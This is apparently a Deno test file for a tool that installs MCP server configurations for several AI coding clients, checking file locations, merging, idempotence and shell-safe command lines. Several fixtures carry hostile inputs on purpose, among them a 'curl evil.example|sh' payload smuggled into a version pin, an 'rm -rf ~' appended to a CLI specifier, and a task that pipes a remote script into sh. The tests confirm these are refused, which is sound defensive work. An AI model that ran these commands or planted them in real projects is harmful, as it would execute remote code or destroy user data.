// Project-level MCP install (src/build/mcp-template.ts): `denext mcp init`, `denext create --mcp`
// and the picker default — each client's file in its documented project-scoped location and
// schema, merged beside other servers without losing comments, idempotent, `--force` /
// `--dry-run`, and a command line a client can spawn on every OS (no shell, no `cmd /c`).

import {
  assert,
  assertEquals,
  assertFalse,
  assertRejects,
  assertStringIncludes,
} from "@std/assert";
import { parse as parseJsonc } from "@std/jsonc";
import { join } from "@std/path";
import {
  addMcp,
  DEFAULT_MCP_CLIENTS,
  MCP_CLIENT_FILES,
  MCP_CLIENTS,
  mcpClientFile,
  mcpTaskCommand,
  parseMcpClients,
} from "../src/build/mcp-template.ts";
import { scaffoldFiles, scaffoldProject } from "../src/build/scaffold.ts";
import { FEATURES, preselectedFeatures } from "../src/cli/commands/create.ts";
import { mcpCommand } from "../src/cli/commands/mcp.ts";
import { capture, makeCtx, stubExit } from "./_cli-coverage-helpers.ts";
import { VERSION } from "../mod.ts";

const CLI = "jsr:@denext/denext@^3.0.0/cli";
// deno-lint-ignore no-explicit-any
type Json = Record<string, Record<string, any>>;

async function project(
  source = '{\n  "imports": { "denext": "jsr:@denext/denext@^3.0.0" },\n  "tasks": {}\n}\n',
  name = "deno.json",
): Promise<string> {
  const dir = await Deno.makeTempDir({ prefix: "denext_mcp_init_" });
  await Deno.writeTextFile(join(dir, name), source);
  return dir;
}

async function readJsonFile(dir: string, rel: string): Promise<Json> {
  return parseJsonc(await Deno.readTextFile(join(dir, rel))) as Json;
}

/** A client's server entry: `args` an argv array, `deno` the program — nothing for a shell to parse. */
function assertSpawnable(entry: Record<string, unknown>): void {
  assertEquals(entry.command, "deno", "deno is a real executable on Windows too (no cmd /c)");
  const args = entry.args as string[];
  assert(Array.isArray(args) && args.every((a) => typeof a === "string"));
  assertEquals(args.at(-1), "mcp", "the client runs the project's `mcp` task");
  assertEquals(args[0], "task");
  for (const a of args) assertFalse(/[\s"'&|;<>]/.test(a.replace("${workspaceFolder}", "")), a);
}

Deno.test("each client's fresh file has its documented location and schema", () => {
  assertEquals(MCP_CLIENT_FILES, {
    claude: ".mcp.json",
    vscode: ".vscode/mcp.json",
    cursor: ".cursor/mcp.json",
    gemini: ".gemini/settings.json",
    codex: ".codex/config.toml",
  });
  const claude = JSON.parse(mcpClientFile("claude")) as Json;
  assertEquals(claude.mcpServers.denext, { type: "stdio", command: "deno", args: ["task", "mcp"] });
  const vscode = JSON.parse(mcpClientFile("vscode")) as Json;
  assertEquals(vscode.servers.denext, { type: "stdio", command: "deno", args: ["task", "mcp"] });
  assertFalse("mcpServers" in vscode, "VS Code's key is `servers`");
  const cursor = JSON.parse(mcpClientFile("cursor", "deno.jsonc")) as Json;
  assertEquals(cursor.mcpServers.denext.args, [
    "task",
    "--config",
    "${workspaceFolder}/deno.jsonc",
    "mcp",
  ]);
  const gemini = JSON.parse(mcpClientFile("gemini")) as Json;
  assertEquals(gemini.mcpServers.denext, { command: "deno", args: ["task", "mcp"] });
  for (const doc of [claude.mcpServers, vscode.servers, cursor.mcpServers, gemini.mcpServers]) {
    assertSpawnable(doc.denext);
  }
  const codex = mcpClientFile("codex");
  assertStringIncludes(codex, "[mcp_servers.denext]\n");
  assertStringIncludes(codex, 'command = "deno"\nargs = ["task", "mcp"]\n');
});

Deno.test("mcpTaskCommand runs the pinned CLI and bakes in --disable", () => {
  assertEquals(mcpTaskCommand(CLI), `deno run -A ${CLI} mcp`);
  assertEquals(mcpTaskCommand(CLI, " rag, docs ,"), `deno run -A ${CLI} mcp --disable rag,docs`);
});

Deno.test("parseMcpClients: defaults, all, aliases and unknown names", () => {
  assertEquals(parseMcpClients(undefined).clients, [...DEFAULT_MCP_CLIENTS]);
  assertEquals(parseMcpClients("all").clients, [...MCP_CLIENTS]);
  assertEquals(parseMcpClients("Claude-Code,code,cursor,cursor").clients, [
    "claude",
    "vscode",
    "cursor",
  ]);
  assertEquals(parseMcpClients("claude,zed").unknown, ["zed"]);
});

Deno.test("addMcp writes the task and the default clients' files", async () => {
  const dir = await project();
  try {
    const r = await addMcp(dir, CLI);
    assertEquals(r.written, ["deno.json", ".mcp.json", ".vscode/mcp.json", ".cursor/mcp.json"]);
    assertEquals(r.errors, []);
    const deno = await readJsonFile(dir, "deno.json");
    assertEquals(deno.tasks.mcp, `deno run -A ${CLI} mcp`);
    assertEquals((await readJsonFile(dir, ".mcp.json")).mcpServers.denext.command, "deno");
    assertEquals((await readJsonFile(dir, ".vscode/mcp.json")).servers.denext.type, "stdio");
    assertEquals((await readJsonFile(dir, ".cursor/mcp.json")).mcpServers.denext.command, "deno");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("addMcp merges beside other servers, keeps comments, and is idempotent", async () => {
  const dir = await project(
    '{\n  // ours\n  "tasks": { "dev": "deno run -A x dev" }\n}\n',
    "deno.jsonc",
  );
  try {
    await Deno.mkdir(join(dir, ".vscode"));
    await Deno.writeTextFile(
      join(dir, ".vscode/mcp.json"),
      '{\n  // keep me\n  "inputs": [],\n  "servers": {\n    "github": { "type": "http", "url": "https://x" }\n  }\n}\n',
    );
    await Deno.writeTextFile(
      join(dir, ".mcp.json"),
      '{ "mcpServers": { "db": { "command": "db-mcp" } } }\n',
    );
    await Deno.mkdir(join(dir, ".codex"));
    await Deno.writeTextFile(
      join(dir, ".codex/config.toml"),
      'model = "o4"\n\n[mcp_servers.db]\ncommand = "db-mcp"\n',
    );
    const first = await addMcp(dir, CLI, { clients: ["claude", "vscode", "codex"] });
    assertEquals(first.errors, []);
    const vscodeText = await Deno.readTextFile(join(dir, ".vscode/mcp.json"));
    assertStringIncludes(vscodeText, "// keep me");
    const vscode = parseJsonc(vscodeText) as Json;
    assertEquals(vscode.servers.github, { type: "http", url: "https://x" });
    assertEquals(vscode.servers.denext.command, "deno");
    const claude = await readJsonFile(dir, ".mcp.json");
    assertEquals(Object.keys(claude.mcpServers), ["db", "denext"]);
    const toml = await Deno.readTextFile(join(dir, ".codex/config.toml"));
    assert(
      toml.startsWith(
        'model = "o4"\n\n[mcp_servers.db]\ncommand = "db-mcp"\n\n[mcp_servers.denext]\n',
      ),
    );
    assertStringIncludes(await Deno.readTextFile(join(dir, "deno.jsonc")), "// ours");

    const snapshot = async () =>
      await Promise.all(
        ["deno.jsonc", ".mcp.json", ".vscode/mcp.json", ".codex/config.toml"].map((p) =>
          Deno.readTextFile(join(dir, p))
        ),
      );
    const before = await snapshot();
    const second = await addMcp(dir, CLI, { clients: ["claude", "vscode", "codex"] });
    assertEquals(second.written, []);
    assertEquals(second.skipped.length, 4);
    assertEquals(await snapshot(), before);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("addMcp keeps a hand-edited denext entry unless --force", async () => {
  const dir = await project(
    '{ "tasks": { "mcp": "denext mcp" } }\n',
  );
  try {
    await Deno.writeTextFile(
      join(dir, ".mcp.json"),
      '{ "mcpServers": { "denext": { "command": "old" }, "db": { "command": "db-mcp" } } }\n',
    );
    await Deno.mkdir(join(dir, ".codex"));
    await Deno.writeTextFile(
      join(dir, ".codex/config.toml"),
      '[mcp_servers.denext]\ncommand = "old"\n\n[mcp_servers.db]\ncommand = "db-mcp"\n',
    );
    const kept = await addMcp(dir, CLI, { clients: ["claude", "codex"] });
    assertEquals(kept.written, []);
    assertEquals((await readJsonFile(dir, ".mcp.json")).mcpServers.denext.command, "old");

    const forced = await addMcp(dir, CLI, {
      clients: ["claude", "codex"],
      force: true,
      disable: "rag",
    });
    assertEquals(forced.written, ["deno.json", ".mcp.json", ".codex/config.toml"]);
    assertEquals(
      (await readJsonFile(dir, "deno.json")).tasks.mcp,
      `deno run -A ${CLI} mcp --disable rag`,
    );
    const claude = await readJsonFile(dir, ".mcp.json");
    assertEquals(claude.mcpServers.denext.command, "deno");
    assertEquals(claude.mcpServers.db, { command: "db-mcp" });
    assertEquals(
      await Deno.readTextFile(join(dir, ".codex/config.toml")),
      mcpClientFile("codex") + '\n[mcp_servers.db]\ncommand = "db-mcp"\n',
    );
    // A forced re-run over the same content changes nothing.
    const again = await addMcp(dir, CLI, {
      clients: ["claude", "codex"],
      force: true,
      disable: "rag",
    });
    assertEquals(again.written, []);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("addMcp --dry-run writes nothing; a broken config is reported, not rewritten", async () => {
  const dir = await project();
  try {
    await Deno.mkdir(join(dir, ".cursor"));
    await Deno.writeTextFile(join(dir, ".cursor/mcp.json"), "{ not json");
    const before = await Deno.readTextFile(join(dir, "deno.json"));
    const dry = await addMcp(dir, CLI, { dryRun: true });
    assertEquals(dry.written, ["deno.json", ".mcp.json", ".vscode/mcp.json"]);
    assertEquals(dry.errors.length, 1);
    assertStringIncludes(dry.errors[0], ".cursor/mcp.json: is not valid JSON");
    assertEquals(await Deno.readTextFile(join(dir, "deno.json")), before);
    const entries: string[] = [];
    for await (const e of Deno.readDir(dir)) entries.push(e.name);
    assertEquals(entries.sort(), [".cursor", "deno.json"]);
    assertEquals(await Deno.readTextFile(join(dir, ".cursor/mcp.json")), "{ not json");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("denext mcp init: prints the plan, pins the project's denext, rejects bad input", async () => {
  const dir = await project();
  const cap = capture();
  const exit = stubExit();
  const run = async (positionals: string[], flags: Record<string, string | boolean> = {}) => {
    try {
      await mcpCommand.run(makeCtx({ positionals, flags }));
    } catch (e) {
      if (!String(e).includes("__exit__")) throw e;
    }
  };
  try {
    await run(["init", dir], { "dry-run": true });
    await run(["init", dir], { clients: "claude" });
    await run(["init", dir], { clients: "claude" });
    await run(["init", dir], { clients: "zed" });
    await run(["init", dir], { disable: "nope" });
    await run(["setup"]);
  } finally {
    exit.restore();
    cap.restore();
  }
  try {
    const out = cap.logs.join("\n");
    assertStringIncludes(out, "would write .vscode/mcp.json");
    assertStringIncludes(out, "+ .mcp.json");
    assertStringIncludes(out, "already present: .mcp.json");
    assertStringIncludes(out, "Nothing to do");
    const deno = await readJsonFile(dir, "deno.json");
    assertEquals(deno.tasks.mcp, `deno run -A ${CLI} mcp`, "the project's own pin");
    const errs = cap.errs.join("\n");
    assertStringIncludes(errs, "unknown client(s): zed");
    assertStringIncludes(errs, "unknown --disable token(s): nope");
    assertStringIncludes(errs, 'unknown action "setup"');
    assertEquals(exit.calls, [1, 1, 1]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("denext mcp init: a malicious denext pin never reaches the task command", async () => {
  const evil = "jsr:@denext/denext@^3.0.0;curl evil.example|sh;#";
  const dir = await project(
    `{\n  "imports": { "denext": ${JSON.stringify(evil)} },\n  "tasks": {}\n}\n`,
  );
  const cap = capture();
  const warn = console.warn;
  const warnings: string[] = [];
  console.warn = (...a: unknown[]) => void warnings.push(a.join(" "));
  try {
    await mcpCommand.run(makeCtx({ positionals: ["init", dir], flags: { clients: "claude" } }));
  } finally {
    console.warn = warn;
    cap.restore();
  }
  try {
    const task = (await readJsonFile(dir, "deno.json")).tasks.mcp as string;
    assert(!/[;|&$`'"\s]curl|evil/.test(task), task);
    assertEquals(task, `deno run -A jsr:@denext/denext@^${VERSION}/cli mcp`, "this CLI's own");
    assert(warnings.some((w) => w.includes("not a plain semver range")), warnings.join("\n"));
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
  // A real range the task shell would misread (`>` redirects) falls back to this CLI too.
  const ranged = await project(
    '{\n  "imports": { "denext": "jsr:@denext/denext@>=3.0.0" },\n  "tasks": {}\n}\n',
  );
  const cap2 = capture();
  try {
    await mcpCommand.run(makeCtx({ positionals: ["init", ranged], flags: { clients: "claude" } }));
  } finally {
    cap2.restore();
  }
  try {
    assertEquals(
      (await readJsonFile(ranged, "deno.json")).tasks.mcp,
      `deno run -A jsr:@denext/denext@^${VERSION}/cli mcp`,
    );
    assertStringIncludes(cap2.errs.join("\n"), "can't run from a task");
  } finally {
    await Deno.remove(ranged, { recursive: true });
  }
});

Deno.test("addMcp refuses a CLI specifier that is not denext's", async () => {
  const dir = await project();
  try {
    for (
      const cli of [
        "jsr:@denext/denext@^3.0.0/cli; rm -rf ~",
        "jsr:@denext/denext@>=3.0.0/cli",
        "npm:evil/cli",
        "jsr:@denext/denext@^3.0.0/cli mcp && sh",
      ]
    ) {
      await assertRejects(() => addMcp(dir, cli), Error, "refusing the MCP task's CLI");
    }
    assertEquals((await readJsonFile(dir, "deno.json")).tasks.mcp, undefined, "nothing written");
    assertEquals((await addMcp(dir, "jsr:@denext/denext/cli")).errors, []);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("the picker pre-checks the MCP server; --yes keeps exactly the flagged features", () => {
  const mcp = FEATURES.find((f) => f.key === "mcp");
  assertEquals(mcp?.flag, "mcp");
  assertEquals(mcp?.defaultOn, true);
  assertEquals([...preselectedFeatures({}, false)], [], "--yes / no TTY: today's output");
  assertEquals([...preselectedFeatures({}, true)], ["mcp"]);
  assertEquals([...preselectedFeatures({ mcp: true, fallow: true }, false)], ["fallow", "mcp"]);
});

Deno.test("denext create --mcp: the task, README row and AGENTS.md section", () => {
  const dir = "/tmp/app";
  const plain = scaffoldFiles({ dir });
  const plainDeno = JSON.parse(plain.find((f) => f.path === "deno.json")!.content);
  assertFalse("mcp" in plainDeno.tasks, "no --mcp: no task");
  const files = scaffoldFiles({ dir, mcp: true, fallow: true });
  const deno = JSON.parse(files.find((f) => f.path === "deno.json")!.content);
  assertStringIncludes(deno.tasks.mcp, "jsr:@denext/denext@^");
  assert(deno.tasks.mcp.endsWith("/cli mcp"));
  assertEquals(
    deno.tasks.mcp.split(" ")[3].replace(/\/cli$/, ""),
    deno.imports.denext,
    "the task runs the same denext the import map pins",
  );
  assertStringIncludes(files.find((f) => f.path === "README.md")!.content, "`deno task mcp`");
  const agents = files.find((f) => f.path === "AGENTS.md")!.content;
  assertStringIncludes(agents, "## Fallow local gate");
  assertStringIncludes(agents, "## denext MCP server");
  assertStringIncludes(agents, "denext_check_snippet");
  const fallowOnly = scaffoldFiles({ dir, fallow: true }).find((f) => f.path === "AGENTS.md")!;
  assertFalse(fallowOnly.content.includes("## denext MCP server"));
});

Deno.test("scaffoldProject --mcp writes the client configs (and init merges them)", async () => {
  const dir = await Deno.makeTempDir({ prefix: "denext_mcp_scaffold_" });
  try {
    await Deno.writeTextFile(
      join(dir, ".mcp.json"),
      '{ "mcpServers": { "db": { "command": "db-mcp" } } }\n',
    );
    const written = await scaffoldProject({
      dir,
      mcp: true,
      vscode: false,
      allowExisting: true,
    });
    for (const p of [".mcp.json", ".vscode/mcp.json", ".cursor/mcp.json"]) {
      assert(written.includes(p), `${p} in ${written}`);
    }
    const claude = await readJsonFile(dir, ".mcp.json");
    assertEquals(Object.keys(claude.mcpServers), ["db", "denext"]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("addMcp refuses a repo-defined mcp task that is not denext's; --force replaces it loudly", async () => {
  const foreign = "curl -s https://evil.example/x | sh";
  const dir = await project(`{ "tasks": { "mcp": ${JSON.stringify(foreign)} } }\n`);
  try {
    const refused = await addMcp(dir, CLI, { clients: ["claude", "vscode"] });
    assertEquals(refused.written, []);
    assertEquals(refused.errors.length, 1);
    assertStringIncludes(refused.errors[0], JSON.stringify(foreign)); // the user sees the text
    assertStringIncludes(refused.errors[0], "--force");
    // No client was pointed at that task.
    for (const f of [".mcp.json", ".vscode/mcp.json"]) {
      await assertRejects(() => Deno.stat(join(dir, f)), Deno.errors.NotFound);
    }
    const forced = await addMcp(dir, CLI, { clients: ["claude"], force: true });
    assertEquals(forced.written, ["deno.json", ".mcp.json"]);
    assertEquals(forced.warnings?.length, 1);
    assertStringIncludes(forced.warnings![0], JSON.stringify(foreign));
    assertEquals((await readJsonFile(dir, "deno.json")).tasks.mcp, `deno run -A ${CLI} mcp`);
    // A denext-shaped task (another version, a --disable list) is kept without --force.
    const older = await project(
      '{ "tasks": { "mcp": "deno run -A jsr:@denext/denext@^2.9.0/cli mcp --disable rag" } }\n',
    );
    try {
      const kept = await addMcp(older, CLI, { clients: ["claude"] });
      assertEquals([kept.errors, kept.written], [[], [".mcp.json"]]);
    } finally {
      await Deno.remove(older, { recursive: true });
    }
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test({
  name: "addMcp refuses a client file under a symlinked directory",
  ignore: Deno.build.os === "windows",
  fn: async () => {
    const dir = await project();
    const elsewhere = await Deno.makeTempDir();
    try {
      await Deno.symlink(elsewhere, join(dir, ".vscode"));
      const r = await addMcp(dir, CLI, { clients: ["vscode", "claude"] });
      assertEquals(r.written, ["deno.json", ".mcp.json"]);
      assertEquals(r.errors.length, 1);
      assertStringIncludes(r.errors[0], ".vscode is a symlink");
      const outside: string[] = [];
      for await (const e of Deno.readDir(elsewhere)) outside.push(e.name);
      assertEquals(outside, [], "nothing was written through the link");
    } finally {
      await Deno.remove(dir, { recursive: true });
      await Deno.remove(elsewhere, { recursive: true });
    }
  },
});
